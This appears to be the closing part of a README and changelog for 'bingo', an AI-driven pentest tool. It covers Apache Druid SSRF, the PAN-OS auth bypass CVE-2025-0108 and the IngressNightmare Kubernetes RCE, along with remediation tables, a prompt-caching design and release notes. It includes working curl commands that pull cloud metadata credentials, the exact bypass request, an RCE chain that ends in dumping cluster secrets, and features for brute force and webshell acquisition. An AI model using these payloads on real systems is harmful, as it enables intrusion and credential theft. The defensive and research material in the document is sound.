| Druid console detected | VERIFIED | INFO |
| Vulnerable version identified | VERIFIED | 7.5 |
| Proxy endpoint accessible | VERIFIED | 7.5 |
| SSRF confirmed (internal URL) | VERIFIED | 9.1 |
| Cloud metadata exposed | VERIFIED | 9.8 |
| Internal service reached | LIKELY | 6.5 |

---

#### Sample PoC Output

```bash
# Cloud metadata extraction (AWS IMDSv1)
curl -sk 'http://target:8888/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Internal Druid coordinator enumeration
curl -sk 'http://target:8888/proxy?url=http://127.0.0.1:8081/druid/coordinator/v1/datasources'

# GCP service account token
curl -sk 'http://target:8888/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google'
```

---

#### AI Auto-Selection Criteria

bingo automatically activates Skill #60 when:
- `/druid/` paths are accessible on the target
- Port 8888 service is identified as Apache Druid
- Response body or headers contain "druid"
- `/unified-console.html` is served by the target

Cloud-hosted targets (AWS/GCP/Azure) are prioritized for metadata endpoint testing.

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to Apache Druid **31.0.2+** or **32.0.1+** | CRITICAL |
| Block management console from external networks | CRITICAL |
| Enable IMDSv2 on AWS instances (PUT-based token required) | HIGH |
| Apply iptables rule: `iptables -A OUTPUT -d 169.254.169.254 -j DROP` on Druid host | HIGH |
| Whitelist allowed proxy destination URLs | MEDIUM |
| Monitor Druid proxy endpoint in WAF/IDS | MEDIUM |

---

### PAN-OS Auth Bypass — PanOSAuthBypassScanner (v2.1)

> **Research basis:**
> Assetnote / Searchlight Cyber — Adam Kues (February 12, 2025)
> "Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)"
> https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/
>
> **Module:** `bingo/tools/panos_auth_bypass.py` — Skill #61 PanOSAuthBypassScanner

---

#### The Architecture: Three-Layer Authentication

PAN-OS management interface uses a **Nginx → Apache → PHP** pipeline where
authentication is decided at the Nginx layer and passed downstream via HTTP header:

```
Client Request
    │
    ▼ Nginx  ──── checks URI against allowlist ──► X-pan-AuthCheck: on/off
    │              /unauth/* → AuthCheck=off
    ▼ Apache ──── applies RewriteRule → internal redirect → double-decode URL
    │
    ▼ PHP    ──── executes if AuthCheck=off (no credential check)
```

The critical flaw: Nginx and Apache **parse the same URL differently**.
Authentication is set at Nginx based on what Nginx sees, but code executes based
on what Apache resolves after its own URL processing.

---

#### The Bug: Double URL Decode via Apache mod_rewrite

Apache's per-directory `RewriteRule` triggers an **internal redirect**, which
causes the URL to be decoded a second time:

| Step | Who | URL state |
|------|-----|-----------|
| Attacker sends | — | `/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css` |
| Nginx decodes once | Nginx | `/unauth/%2e%2e/php/...` → no `..` → **AuthCheck=off** |
| Apache receives | Apache | Same raw URL, decodes once → `%2e%2e` still encoded |
| RewriteRule match | Apache | `/PAN_help/x.css` matches → **internal redirect** |
| Redirect re-decodes | Apache | `%2e%2e` → `..` (traversal appears!) |
| Path normalize | Apache | `/unauth/../php/ztp_gate.php` → `/php/ztp_gate.php` |
| PHP executes | PHP | AuthCheck=off → **runs with no authentication** ✅ |

**The single attack request:**

```http
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
Host: [PAN-OS management interface]
```

---

#### Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| PAN-OS 10.2.x | < 10.2.14 | **10.2.14+** |
| PAN-OS 11.0.x | < 11.0.7  | **11.0.7+** |
| PAN-OS 11.2.x | < 11.2.5  | **11.2.5+** |

---

#### Impact

| Scenario | Severity | CVSS |
|----------|----------|------|
| Auth bypass alone | CRITICAL | 9.3 |
| + CVE-2024-9474 privilege escalation chain | CRITICAL | **9.9** |
| Management config disclosure | HIGH | 8.5 |

The RCE chain mirrors CVE-2024-0012 (prior exploit widely used in the wild).

---

#### What bingo Tests (Skill #61)

```
1. PAN-OS Management Interface Fingerprint (VERIFIED)
   ├── /php/login.php  → PAN-OS login page
   ├── /global-protect/login.esp
   ├── x-pan-* response headers
   ├── HTML body: "GlobalProtect", "Palo Alto Networks"
   └── Port 443 / 4443 / 8443 probing

2. Version Extraction (VERIFIED)
   └── Regex: pan-os[\s/v]+(\d+\.\d+\.\d+) → vulnerable range check

3. CVE-2025-0108 Auth Bypass Test (VERIFIED)
   ├── /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
   ├── /unauth/%252e%252e/php/login.php/PAN_help/x.css
   ├── /unauth/%252e%252e/php/errors.php/PAN_help/x.js
   └── /unauth/%252e%252e/php/php_session.php/PAN_help/x.html
       → HTTP 200 + PHP body (not login redirect) = BYPASS CONFIRMED

4. RCE Chain Assessment (LIKELY)
   └── auth_bypass_confirmed → rce_chain_possible flag
       (CVE-2025-0108 + CVE-2024-9474 combination)
```

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
| PAN-OS interface detected | VERIFIED | INFO |
| Vulnerable version | VERIFIED | 7.5 |
| Auth bypass confirmed | VERIFIED | 9.3 |
| RCE chain possible | LIKELY | 9.9 |

---

#### AI Auto-Selection Criteria

bingo automatically activates Skill #61 when:
- Port 443 or 4443 returns PAN-OS management interface HTML
- Response body contains "GlobalProtect" or "Palo Alto Networks"
- `/php/login.php` returns HTTP 200 with PAN-OS content
- `x-pan-*` response headers are detected

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to **PAN-OS 10.2.14+** (10.2.x branch) | CRITICAL |
| Upgrade to **PAN-OS 11.0.7+** (11.0.x branch) | CRITICAL |
| Upgrade to **PAN-OS 11.2.5+** (11.2.x branch) | CRITICAL |
| **Restrict management interface to trusted IPs** | CRITICAL |
| Remove management interface from internet exposure | CRITICAL |
| Apply Palo Alto advisory PAN-273971 compensating controls | HIGH |

---

### IngressNightmare — IngressNightmareScanner (v2.1)

> **Research basis:**
> Wiz Research — Nir Ohfeld, Ronen Shustin, Sagi Tzadik, Hillai Ben-Sasson (March 24, 2025)
> "IngressNightmare: CVE-2025-1974 — 9.8 Critical RCE in Ingress NGINX for Kubernetes"
> https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
>
> **Module:** `bingo/tools/ingress_nightmare_rce.py` — Skill #62 IngressNightmareScanner
>
> **CVEs:** CVE-2025-1974 (CVSS 9.8) · CVE-2025-24514 · CVE-2025-1097 · CVE-2025-1098

---

#### Impact at Scale

| Metric | Value |
|--------|-------|
| Cloud environments affected | **43%** |
| Publicly exposed vulnerable clusters | **6,500+** (Fortune 500 included) |
| ingress-nginx cluster share | 41% of internet-facing clusters |
| CVSS Score | **9.8 Critical** |

---

#### Architecture: Why the Bug Exists

Ingress NGINX Controller translates Kubernetes Ingress objects into NGINX
configurations and validates them with `nginx -t`. An admission webhook does this
validation — it is **unauthenticated by default**, accessible from any pod.

```
External Attacker / Internal Pod
    │
    ├──[Phase 1: Upload .so payload]──────────────────────────────────────
    │   POST /  (HTTP to NGINX port 80/443)
    │   Body: ELF shared library > 8KB
    │   Content-Length: 9999999  ← larger than body → NGINX hangs, FD stays open
    │   Result: /proc/<nginx_pid>/fd/<n>  ← tmpfile accessible via ProcFS
    │
    └──[Phase 2: Admission Controller Injection]──────────────────────────
        POST https://ingress-nginx-controller:8443/networking.k8s.io/v1/ingresses
        Body: AdmissionReview JSON with malicious annotation
              → ssl_engine /proc/<pid>/fd/<n>;  (loads our .so!)
              → nginx -t executes → .so constructor runs → RCE ✓
              → ClusterRole secret access → kubectl get secrets --all-namespaces
```

---

#### CVE Chain Detail

| CVE | Injection Point | Bypass Required | Severity |
|-----|----------------|-----------------|---------|
| **CVE-2025-24514** | `auth-url` annotation | URL unsanitized → direct injection | 8.8 |
| **CVE-2025-1097** | `auth-tls-match-cn` | `CN=...#(\n)` comment escape | 8.8 |
| **CVE-2025-1098** | Mirror UID field | Non-annotation field, no regex filter | 8.8 |
| **CVE-2025-1974** | `ssl_engine` directive | Undocumented OpenSSL module, any position | **9.8** |

**Why `ssl_engine` and not `load_module`?**

```
load_module → must appear at start of config → injection context is mid-config → FAILS
ssl_engine  → OpenSSL module, works anywhere in config → loads .so at nginx -t → RCE ✓
```

---

#### What bingo Tests (Skill #62)

```
1. Kubernetes API Server Detection (VERIFIED)
   └── /api/v1, /apis, /version → gitVersion extraction

2. Ingress NGINX Fingerprint (VERIFIED)
   ├── server: nginx header
   ├── ingress-nginx version regex
   └── /metrics, /healthz endpoints

3. Version Vulnerable Check (VERIFIED)
   └── < 1.11.5 or < 1.12.1 → vulnerable flag

4. Admission Controller Exposure (VERIFIED)
   ├── Port 8443/443 probe with AdmissionReview JSON
   └── Unauthenticated response → CRITICAL finding

5. Unauthenticated Access Confirmation (VERIFIED)
   └── Safe AdmissionReview probe → acceptance check

6. Annotation Injection Surface Mapping (VERIFIED/LIKELY)
   ├── CVE-2025-24514: auth-url annotation
   ├── CVE-2025-1097: auth-tls-match-cn annotation
   └── CVE-2025-1098: mirror URI annotation

7. RCE Chain Assessment (LIKELY)
   └── admission accepts requests + injection surface
       → client body .so upload + ssl_engine path
       → ClusterRole all-namespace secret access
```

---

#### SSRF Pairing

```
External SSRF vulnerability (any target)
    → pivot to internal Kubernetes pod network
    → reach ingress-nginx admission controller (port 8443)
    → no authentication required
    → CVE-2025-1974 RCE → cluster takeover
```

bingo's SSRF scanners (ApacheDruidSSRF #60, SSRF #11, etc.) automatically
chain with IngressNightmareScanner when internal cluster access is detected.

---

#### Evidence Levels

| Finding | Evidence Level | CVSS |
|---------|---------------|------|
| K8s cluster detected | VERIFIED | INFO |
| Vulnerable version | VERIFIED | 8.8 |
| Admission controller exposed | VERIFIED | 9.8 |
| Unauthenticated access | VERIFIED | 9.8 |
| Annotation injection surface | VERIFIED/LIKELY | 8.8 |
| Full RCE chain | LIKELY | 9.8 |

---

#### Remediation

| Action | Priority |
|--------|----------|
| Upgrade to **ingress-nginx 1.11.5+** (1.11.x branch) | CRITICAL |
| Upgrade to **ingress-nginx 1.12.1+** (1.12.x branch) | CRITICAL |
| **NetworkPolicy**: only kube-apiserver → port 8443 | CRITICAL |
| Disable admission webhook if upgrade impossible | HIGH |
| **Migrate to Kubernetes Gateway API** (ingress-nginx EOL Nov 2025) | HIGH |

> **Note:** ingress-nginx reached End of Life on **November 12, 2025**.
> All users must migrate to [Kubernetes Gateway API](https://gateway-api.sigs.k8s.io/)
> or an alternative controller (Traefik, HAProxy, NGINX Gateway Fabric).

---

### Prompt Cache Optimizer — Three-Breakpoint Architecture (v2.1)

> **Research basis:**
> ProjectDiscovery Engineering — "How We Cut LLM Cost with Prompt Caching"
> https://projectdiscovery.io/blog/how-we-cut-llm-cost-with-prompt-caching
> **Module:** `bingo/models/prompt_cache.py` — integrated into all providers

---

#### Background: The Repetition Waste Problem

Every time bingo executes a pipeline step, it sends a message to the AI. Without caching,
the entire static system prompt (≈20,000 characters) and skill definitions (60 skills) are
re-sent from scratch on **every single step**. For a 28-step pipeline run, this wastes:

```
25 steps × 20,000-char system prompt = 500,000 characters re-sent (every time)
```

The Prompt Cache Optimizer eliminates this repetition using three techniques directly adapted
from ProjectDiscovery's production findings.

---

#### Three-Breakpoint Architecture (BP1 / BP2 / BP3)

The prompt is divided into three cacheable segments, each with its own cache breakpoint:

| Breakpoint | Content | Change Frequency | Cache Effect |
|-----------|---------|-----------------|-------------|
| **BP1** | `UNIVERSAL_PENTEST_CORE` + model-specific instructions | Almost never | Cached for the entire session (day) |
| **BP2** | Warmup history + 62 skill definitions | Only on new skill releases | Cached until skill list changes |
| **BP3** | Conversation history (last 12 turns) | Every turn | Sliding window — previous turns re-cached |

```
Message structure with cache breakpoints:

[system: UNIVERSAL_PENTEST_CORE + MODEL_EXTRA]  ← BP1 ✦ cache_control: ephemeral
[user/asst: warmup × 4 + skill block]           ← BP2 ✦ cache_control: ephemeral
[user/asst: last 12 turns of conversation]      ← BP3 ✦ cache_control: ephemeral
[user: DYNAMIC TAIL — target URL + date]        ← NO cache mark (changes every call)
```

---

#### Relocation Trick

The most impactful single change. Dynamic content that changes every call (current target URL,
session date) is moved to the **very end** of the prompt, after all cached segments.

**Before (cache-busting every turn):**
```
[STATIC 20k chars] [TARGET: loan2.koweb.co.kr  today 12:34:56] [TOOLS 10k chars]
                    ↑ changes every turn → invalidates everything that follows
```

**After (static prefix stays valid):**
```
[STATIC 20k chars cached] [TOOLS 10k chars cached] … [TARGET + DATE at the tail]
                                                       ↑ only this tiny section changes
```

Cache hit rate jump: **7% → 74%** (ProjectDiscovery empirical data, 20+ step tasks).

---

#### Frozen Datetime

Using a full timestamp (`2026-06-15 00:07:33`) in the system prompt causes a cache miss every
minute. bingo now uses only the current **date** (`2026-06-15`) in the prompt, freezing it for
the entire day and preventing unnecessary cache invalidation during long pipeline runs.

---

#### Provider Support

| Provider | Cache Mechanism | Implementation |
|---------|----------------|---------------|
| **Claude (Anthropic)** | Native `cache_control: {"type": "ephemeral"}` | 3 breakpoints injected; `anthropic-beta: prompt-caching-2024-07-31` header |
| **DeepSeek** | Server-side prefix caching | `prefix_caching: true` payload parameter |
| **OpenAI / GPT** | Automatic prefix cache | Structural ordering maximizes cache-hit ratio (no explicit param) |
| **GLM / Qwen / Ollama** | Structural ordering | Same structural optimization as OpenAI |

---

#### Cost Model

| Operation | Cost multiplier |
|-----------|----------------|
| Cache write (first call) | 1.25× normal token price |
| Cache read (cache hit) | **0.10×** normal token price |
| Net saving at 74% hit rate | **~70% cost reduction** |

Anthropic cache TTL: 5 minutes (refreshed on each read). DeepSeek: automatic, no TTL concern.

---

#### Expected Impact on bingo Pipeline

| Pipeline steps | Estimated hit rate | Cost reduction |
|---------------|-------------------|---------------|
| 9 phases (standard) | ~54% | ~54% |
| 23 steps (full exploit) | ~74% | **~70%** |
| Same budget → can run | 2.5× more targets | — |

---

#### Cache Statistics Output (example)

```
⚡ Prompt Cache Optimizer active — BP1(system)/BP2(skills)/BP3(conversation)
🔑 Anthropic prompt-caching-2024-07-31 beta header active — 3 cache_control markers
📅 Frozen datetime: 2026-06-15 — prevents per-minute cache busting
📌 Relocation trick: dynamic content moved to prompt tail → static cache valid

... (after 10 pipeline steps) ...

📊 Cache stats: total=10 | hits=8(80%) | saved≈160000tok | cost_reduction≈70%
```

---

## Changelog

### v2.1.4 — `bingo --update` Self-Updater *(2026-06)*

Update bingo to the latest version with a single command — works on **macOS, Windows, and Linux**.

```bash
bingo --update
```

**Auto-detects installation method:**

| Installed via | Update method |
|---------------|--------------|
| `git clone` | `git pull origin main` |
| `pip install bingo-ai` | `pip install --upgrade bingo-ai` (checks PyPI first) |

**Example output (git clone):**
```
📂 Installed via git clone — updating with git pull
⬆  Running git pull...

From https://github.com/bingook/bingo
 * branch    main -> FETCH_HEAD
Already up to date.

✅ Update complete! Restart bingo to apply changes.
```

**Example output (pip, new version available):**
```
📦 Installed via pip — updating from PyPI
📡 Checking for latest version...
🆕 New version available: v2.1.3 → v2.1.4
⬆  Running pip upgrade...

✅ Update complete! Restart bingo to apply changes.
```

- If network is unavailable, the manual command is printed for easy copy-paste.
- Multilingual output: Korean / Chinese / English.

---

### v2.1.3 — Session Resume + /retry + Notifications *(2026-06)*

#### New Feature 1 — Session Auto-Save & Resume

Every loop iteration saves the full session state automatically.  
On next launch, BINGO detects the previous session and asks:

```
╭─ 🔄 Previous session found ──────────────────────╮
│  Target: https://target.co.kr                    │
│  Continue from where you left off?               │
╰──────────────────────────────────────────────────╯
Resume [Y/n]:
```

Restored state includes: conversation history, agent state, auth cookies, loop count, and last execution result.

---

#### New Feature 2 — `/retry` Command

Re-run only the last failed step without restarting from scratch.

```
❯ /retry
🔁 Retrying last failed step...
→ AI analyzes the previous error and writes a corrected approach
```

BINGO sends the last execution result back to AI with the instruction to fix only what failed — no full restart required.

---

#### New Feature 3 — System Notifications

Automatic macOS notification + terminal bell on:

| Event | Notification |
|-------|-------------|
| Task complete (`TASK_COMPLETE`) | 🔔 Normal sound (Glass) |
| Hash found | 🚨 Critical sound (Basso) |
| Credential found | 🚨 Critical sound (Basso) |

Works on macOS via `osascript`. Terminal bell (`\a`) fires on all platforms.

---

### v2.1.2 — Mid-Task Hint Injection + General Conversation Mode *(2026-06)*

#### New Feature 1 — Mid-Task Hint Injection

While the AI execution loop is running, you can now **inject a hint without restarting**.

**Method A — Ctrl+C during loop:**
```
[Loop #7 running...]
→ press Ctrl+C
⚡ Loop paused — type a hint to keep going
   (press Enter or Ctrl+C again → stop completely)
💬 hint ❯ skip captcha, try other parameters
💬 Hint injected — resuming loop (#7)
→ AI applies hint immediately, loop continues
```

**Method B — `/hint` command (anytime):**
```
❯ /hint the login param might be mem_id not user
```

| | Ctrl+C method | /hint command |
|--|--|--|
| **When** | During loop | Anytime |
| **Loop** | Pause → resume | Continues |
| **Stop option** | Enter = full stop | No stop |

Fully multilingual: `ko / zh / en`

---

#### New Feature 2 — General Conversation Mode (Dual-Mode AI)

BINGO now switches automatically between pentest mode and general conversation mode.

- Ask about models, say thank you, ask general questions → natural conversational response
- Give a target URL or pentest task → full pentest mode
- Responses always in the user's configured language (`/lang`)

**Classification logic:**
- URL detected → always pentest mode
- "What is XSS?", "explain SSRF" → general mode (conceptual prefix detected)
- "hack this site", target URLs → pentest mode

---

### v2.1.1 — Hotfix *(2026-06)*

#### Bug Fix — Login False Positive (ASP/IIS Session Cookie Misdetection)

**Problem:** The brute-force login module incorrectly reported successful logins on ASP/IIS targets.

- **Root cause 1 — `auth_tools.py`:** The `_is_login_success()` fallback condition was `status == 200 and len(body) > 500`. On ASP/IIS, every failed login returns HTTP 200 with a ~3,649-byte login page — so *all* attempts were falsely marked as successful.
- **Root cause 2 — `anti_hallucination.py`:** The `add_credential()` method treated any session cookie as evidence of login success. ASP always issues `ASPSESSIONID` regardless of whether authentication succeeded or failed.

**Fix:**
| File | Change |
|---|---|
| `auth_tools.py` | Fallback changed from `status==200 and len(body)>500` → `False`. Added `baseline_len` parameter: probe one known-wrong credential first, then compare response length delta (`>200 bytes`) to detect real success. All three methods (`test_default_creds`, `brute_force`, `password_spray`) now capture a baseline response before testing. |
| `anti_hallucination.py` | Generic session cookies (`ASPSESSIONID`, `PHPSESSID`, `JSESSIONID`) excluded from the "meaningful cookie" check. `VERIFIED` now requires both a success keyword *and* a non-generic cookie or off-page redirect. Fail keywords (`invalid`, `틀렸`, `인증실패`, etc.) immediately force `INFERRED` grade. `CredentialVerifier.verify()` patched with the same logic. |

**Impact:** Zero breaking changes. All existing tests pass. False positives on ASP/IIS brute-force are eliminated.

---

### v2.1.0 — Official Release *(2026-06)*
- **Zero-Hallucination System** — all findings labeled `VERIFIED` / `LIKELY` / `INFERRED` / `AI_ANALYSIS`; nothing discarded
- **Interactive Post-Report Actions** — 3–5 numbered next steps auto-presented after every report; enter a number to continue
- **ACPV — Client-Side Auth Bypass** — AI auto-detects JS-based auth (localStorage/sessionStorage), tests unauthenticated APIs, generates browser console PoC automatically
- **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
- **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
- **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
- **62 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59), ApacheDruidSSRF (#60), PanOSAuthBypass (#61), IngressNightmareRCE (#62)
- **Prompt Cache Optimizer** — Three-Breakpoint Architecture (BP1/BP2/BP3) + Relocation Trick + Frozen Datetime; ~70% API cost reduction for 28-step pipelines
- **CloudflareACMEBypass (#58)** — ACME HTTP-01 fail-open WAF bypass detection; origin server fingerprinting, LFI, Spring Actuator, header-based attack vector testing via /.well-known/acme-challenge/* path
- **React2ShellWafBypass (#59)** — CVE-2025-55182 pre-auth RCE attack surface detection + 5 multipart grammar un-equivalence WAF bypass techniques (BP1–BP5, total $170k bounty); safe probe + Burp-ready PoC curl generation
- **28-step exploit pipeline** — added Phase 28 IngressNightmareRCE (CVE-2025-1974) after Phase 27 PanOSAuthBypass
- **62 skill modules** — IngressNightmareRCE (#62): Kubernetes ingress-nginx unauthenticated admission controller + annotation injection + ssl_engine RCE chain (CVE-2025-1974, CVSS 9.8)
- **28 pipeline steps** — Phase 28: IngressNightmareScanner K8s/ingress-nginx detection + admission controller exposure + RCE chain assessment
- Production-stable (`Development Status :: 5 - Production/Stable`)

### v2.0.x — Beta
- Initial public release
- 5-phase red team pipeline
- WAF bypass, hash cracking, tool auto-install
- Multi-model support (DeepSeek / Claude / GPT / GLM / Qwen / Ollama)

---

## Contributing

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

Pull requests are welcome. Please open an issue first for major changes.

---

## License

MIT © 2026 bingook
